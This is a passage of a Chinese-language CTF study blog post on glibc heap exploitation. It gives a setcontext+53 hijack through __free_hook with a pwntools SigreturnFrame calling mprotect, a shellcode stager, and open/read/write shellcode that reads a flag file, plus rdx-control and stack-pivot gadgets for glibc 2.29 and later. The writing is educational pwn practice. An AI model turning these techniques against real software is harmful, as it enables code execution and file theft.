    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>函数和变量太多了有点没看懂，到后面再分析。</p>
<h4 id="smallbin的利用"><a href="#smallbin的利用" class="headerlink" title="smallbin的利用"></a>smallbin的利用</h4><p>smallbin脱链的时候也会有unlink这样的东西，但是没有合并的时候的检测机制，所以unlink也可以在这个条件下使用，但是还没见过</p>
<h2 id="堆上的orw"><a href="#堆上的orw" class="headerlink" title="堆上的orw"></a>堆上的orw</h2><p>利用setcontext实现程序流的劫持。定义</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ucontext.h></span></span>

<span class="token keyword">int</span> <span class="token function">setcontext</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token class-name">ucontext_t</span> <span class="token operator">*</span>ucp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>而这个函数的内容，</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">&lt;setcontext&gt;:     push   rdi
&lt;setcontext+1&gt;:   lea    rsi,[rdi+0x128]
&lt;setcontext+8&gt;:   xor    edx,edx
&lt;setcontext+10&gt;:  mov    edi,0x2
&lt;setcontext+15&gt;:  mov    r10d,0x8
&lt;setcontext+21&gt;:  mov    eax,0xe
&lt;setcontext+26&gt;:  syscall 
&lt;setcontext+28&gt;:  pop    rdi
&lt;setcontext+29&gt;:  cmp    rax,0xfffffffffffff001
&lt;setcontext+35&gt;:  jae    0x7ffff7a7d520 &lt;setcontext+128&gt;
&lt;setcontext+37&gt;:  mov    rcx,QWORD PTR [rdi+0xe0]
&lt;setcontext+44&gt;:  fldenv [rcx]
&lt;setcontext+46&gt;:  ldmxcsr DWORD PTR [rdi+0x1c0]
&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]
&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]
&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]
&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]
&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]
&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]
&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]
&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]
&lt;setcontext+94&gt;:  push   rcx
&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]
&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]
&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]
&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]
&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]
&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]
&lt;setcontext+125&gt;: xor    eax,eax
&lt;setcontext+127&gt;: ret    
&lt;setcontext+128&gt;: mov    rcx,QWORD PTR [rip+0x356951]        # 0x7ffff7dd3e78
&lt;setcontext+135&gt;: neg    eax
&lt;setcontext+137&gt;: mov    DWORD PTR fs:[rcx],eax
&lt;setcontext+140&gt;: or     rax,0xffffffffffffffff
&lt;setcontext+144&gt;: ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用rdi寄存器控制了几乎所有的寄存器，其实就是保存和回复上下文，和SROP应该有类似的原理。</p>
<p>至于为什么要跳到 <code>setcontext+53</code> 这个位置。因为<code>fldenv [rcx]</code>指令会造成程序执行的时候直接crash，所以要避开这个指令。</p>
<blockquote>
<p>此外rsp的值也要注意，push ecx 和后面的ret，要求指向的内存可以访问</p>
</blockquote>
<p><strong>利用</strong>，其中参数就是rdi，所以我们就是要构造，<code>ucontext_t</code>可以利用SROP的<code>Sigreturnframe()</code>来构造结构体。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 指定机器的运行模式</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
<span class="token comment"># 设置寄存器</span>
frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>
frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>
frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>
frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>类似上面。一般利用思路如下</p>
<p>执行<code>mprotect</code>函数，后注入shellcode。也可以直接用来构造ROP链。</p>
<p><code>打hook为&lt;setcontext+53&gt;</code>然后</p>
<p>只要把该SigreturnFrame写入一个chunk中，free它就能达到目的，这里就要事先去了解SigreturnFrame的结构了，这是一个str类型的东西，free这个东西的时候，他就是rdi，通过这个可以直接掌控rdi偏移位置的寄存器。</p>
<p><img src="https://i.loli.net/2021/04/25/TJmHMPc46jQSXx8.png" alt="图片.png" loading="lazy"></p>
<p>除掉第一个return的系统调用，偏移和setcontext一摸一样。值得注意的是当free这个变量之后，rsp是最先恢复的，所以内存一定要可以访问，<strong>而rcx对应的是rdi+0xa8</strong>那么对应到框架里面就是rip所以等价起来就是控制rip就可以了。总的来说，一般偏移不变，特殊情况除外。</p>
<p>看一段<code>mprotect</code>的利用</p>
<p>首先，我们把setcontent+53的地址写入<code>__free_hook</code>，并在其之后0x10字节内存中写上两遍<code>__free_hook</code>+0x18的地址，最后把如下shellcode1写入：</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">xor rdi,rdi
mov rsi,%d
mov edx,0x1000

mov eax,0
syscall

jmp rsi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>setcontext的主要代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> free_hook<span class="token operator">+</span><span class="token number">0x10</span>
frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> new_addr
frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x1000</span>
frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>
frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当mprotect执行完时，rsp指向<code>__free_hook</code>+0x10，其中的值为<code>__free_hook</code>+0x18，这样我们就执行了第一段shellcode，这段shellcode的目的是往指定内存中读入shellcode并跳过去执行<br> 我们第二段shellcode如下：</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov rax, 0x67616c662f2e ;&#x2F;&#x2F; .&#x2F;flag
push rax

mov rdi, rsp ;&#x2F;&#x2F; .&#x2F;flag
mov rsi, 0 ;&#x2F;&#x2F; O_RDONLY
xor rdx, rdx ;
mov rax, 2 ;&#x2F;&#x2F; SYS_open
syscall

mov rdi, rax ;&#x2F;&#x2F; fd 
mov rsi,rsp  ;
mov rdx, 1024 ;&#x2F;&#x2F; nbytes
mov rax,0 ;&#x2F;&#x2F; SYS_read
syscall

mov rdi, 1 ;&#x2F;&#x2F; fd 
mov rsi, rsp ;&#x2F;&#x2F; buf
mov rdx, rax ;&#x2F;&#x2F; count 
mov rax, 1 ;&#x2F;&#x2F; SYS_write
syscall

mov rdi, 0 ;&#x2F;&#x2F; error_code
mov rax, 60
syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后其他的方法还有待自己学习。</p>
<p><strong>看一篇demo</strong></p>
<p><a target="_blank" rel="noopener" href="https://myenid.github.io/2021/05/19/VNCTF2021/">vnctf2021</a></p>
<h3 id="glibc-gt-2-29"><a href="#glibc-gt-2-29" class="headerlink" title="glibc&gt;2.29"></a>glibc&gt;2.29</h3><p>当到了高版本libc之后rdi变成了rdx，而控制rdx的gadget少的不行，所以提供一个万能gadget</p>
<ul>
<li>第一种setcontext的方法</li>
</ul>
<p>这其中用到的 <code>gadget</code>是 <code>getkeyserv_handle+576</code>，其汇编如下</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov     rdx, [rdi+8]
mov     [rsp+0C8h+var_C8], rax
call    qword ptr [rdx+20h]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这个 <code>gadget</code>可以通过 <code>rdi</code> 来控制 <code>rdx</code>， 非常好用，而且从 Glibc2.29到2.32都可用</p>
<ul>
<li>第二种，栈迁移</li>
</ul>
<p>又要控制 <code>rdx</code>又要构造 <code>setcontext</code>，很麻烦，在这里介绍另一种解法，通过 gadget控制rbp的值，从而进行栈迁移，将栈劫持到我们可以控制的堆地址上，并执行预先布置的rop链，从而获取flag</p>
<p>先介绍一下万金油的gadget <code>svcudp_reply+26</code>，汇编如下</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov rbp, qword ptr [rdi + 0x48]; 
mov rax, qword ptr [rbp + 0x18]; 
lea r13, [rbp + 0x10]; 
mov dword ptr [rbp + 0x10], 0; 
mov rdi, r13; 
call qword ptr [rax + 0x28];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个gadgets主要是通过 <code>rdi</code>控制 <code>rbp</code>进而控制 <code>rax</code>并执行跳转，由于我们已经控制了 <code>rbp</code>的值，因此只需要在 <code>rax+0x28</code>的位置部署 <code>leave；ret</code>即可完成栈迁移</p>
<p>从而在我们已经布置好 <code>orw rop链</code>的位置伪造栈地址并劫持控制流，最终读取<code>flag</code></p>
<ul>
<li>第三种，环境变量打main函数的返回地址</li>
</ul>
<p>这种方法国赛有师傅用到了，写在了我的国赛WP上。</p>
<p>如果 <code>栈地址</code>已知的话，解题过程会更加简单，而且不需要特意去寻找万金油的gadgets</p>
<p>那么如何泄露<code>栈地址</code>呢？</p>
<p>其实程序的栈地址会存放在 <code>__environ</code>中，我们只要输出<code>__environ</code>的内容就能获取栈地址</p>
<p>在获取到栈地址后，我在main函数的 <code>ret</code>处下一个断点，发现main函数返回值和我们泄露的栈地址正好相差 <strong>xxx</strong>这个偏移要自己去算，反复验证，反复计算。稍微错一点都不可以。</p>
<p>至此，堆上的orw基本就这些姿势了。还是强调，手法，百无禁忌</p>
</div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Ev3r</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://example.com/2021/05/13/%E5%A0%86%E7%9F%A5%E8%AF%86-%E6%8C%81%E7%BB%AD/" title="堆知识--持续">http://example.com/2021/05/13/%E5%A0%86%E7%9F%A5%E8%AF%86-%E6%8C%81%E7%BB%AD/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-Ev3r/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-EV3R 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-Ev3r-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/05/13/HITCON-Trainging-heapcreator/" rel="prev" title="HITCON Trainging heapcreator"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">HITCON Trainging heapcreator</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/05/10/%E8%BF%90%E8%A1%8C%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AClibc/" rel="next" title="运行不同版本libc"><span class="post-nav-text">运行不同版本libc</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>如果您有任何关于博客内容的相关讨论，欢迎前往 <a href="https://github.com/YunYouJun/yunyoujun.github.io/discussions" target="_blank">GitHub Discussions</a> 与我交流。</span><br></div><div id="waline"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js", () => {
  const walineConfig = {"enable":true,"serverURL":"https://waline.yunyoujun.cn","comment":true,"visitor":true,"avatarCDN":"https://cdn.v2ex.com/gravatar/","placeholder":"填写邮箱，可以收到回复通知哦～","requiredFields":["nick"],"el":"#waline","lang":"zh-CN"}
  walineConfig.path = "/2021/05/13/%E5%A0%86%E7%9F%A5%E8%AF%86-%E6%8C%81%E7%BB%AD/"
  new Waline(walineConfig)
}, window.Waline);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">这里是</a></div><div class="copyright"><span>&copy; 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Ev3r</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.4.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.5.2</span></div><div class="live_time"><span>本博客已诞生</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2021-03-10T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
}
blog_live_time();
</script></div><div class="footer-custom-text">pwn菜鸡</a></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script>const date = new Date();
const today = (date.getMonth() + 1) + "-" + date.getDate()
const mourn_days = ["4-4"]
if (mourn_days.includes(today)) {
  document.documentElement.style.filter = "grayscale(1)";
}</script></div></body></html>